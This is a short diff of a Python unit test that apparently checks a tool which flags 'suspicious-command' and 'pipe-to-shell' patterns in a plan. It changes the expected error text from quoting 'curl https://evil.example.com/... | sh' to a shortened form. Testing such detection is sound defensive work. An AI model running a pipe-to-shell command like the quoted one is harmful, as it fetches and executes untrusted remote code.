@@ -140,8 +140,8 @@ class TestThePlan(unittest.TestCase):
         self.assertIn(self.path, err)
         self.assertIn("suspicious-command", err)
         self.assertIn("pipe-to-shell", err)
-        self.assertIn("it runs: curl https://evil.example.com/... "
-                      "--api-key=[redacted] | sh", err)
+        self.assertIn("it runs: curl (+4 arguments not shown); "
+                      "URL: https://evil.example.com/...", err)
         for name in FINE:
             self.assertNotIn(name, err)
         self.assertIn("dry run", err)
